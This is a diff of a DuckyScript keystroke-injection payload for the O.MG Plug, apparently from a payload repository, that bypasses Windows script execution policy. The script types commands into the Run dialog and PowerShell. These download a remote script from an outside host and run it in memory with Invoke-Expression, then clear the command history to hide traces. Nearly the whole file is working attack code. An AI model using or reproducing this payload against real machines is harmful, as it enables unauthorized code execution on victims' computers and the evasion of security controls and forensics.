@@ -1,6 +1,12 @@
 REM_BLOCK
-    The Bypass Buddy
-    by salt-or-ester - salt-or-ester@protonmail.com
+    Title: The Bypass Buddy
+	Author: salt-or-ester | salt-or-ester@protonmail.com | https://gitgud.io/saltorester 
+	Description: Evade Windows Script Execution Policy
+	Target: Windows 11
+    Device: O.MG Plug | https://hak5.org/products/omg-plug
+	Version: 1.1
+	Category: Execution
+
     Tested on: O.MG Plug Elite, Windows 11
     Will likely work on other devices and Windows flavors
     
@@ -13,19 +19,23 @@ REM_BLOCK
     This can be accomplished without administrative rights.
 END_REM
 
+REM Formatting is 'untabbed' to comply with O.MG Editor/UI
+FUNCTION EVADE_SCRIPT_EXECUTION_POLICY()
+REM Normally I would add this below the header, as it's a constant, but moving it here for portability
 REM Payload to download and run in memory
 DEFINE #PAYLOAD_URL "http://10.10.10.10/payload.ps1"
-
-FUNCTION EVADE_SCRIPT_EXECUTION_POLICY()
 GUI r
-DELAY 2000 REM Let GUI load
+REM Let GUI load
+DELAY 2000
 STRINGLN powershell
-DELAY 1000 REM Let Powershell window open
+REM Let Powershell window open
+DELAY 1000
 STRINGLN Start-Job -ScriptBlock { try { $response = Invoke-WebRequest -Uri #PAYLOAD_URL -ErrorAction Stop; $scriptContent = [System.Text.Encoding]::UTF8.GetString($response.Content); cd ~; Invoke-Expression $scriptContent } catch { Write-Error "Failed to download or execute script: $_" } }
 STRINGLN Clear-History
 STRINGLN clear
 GUI DOWNARROW
 END_FUNCTION
 
-DELAY 3000 REM Wait for device to be "ready"
+REM Wait for device to be "ready"
+DELAY 3000
 EVADE_SCRIPT_EXECUTION_POLICY()
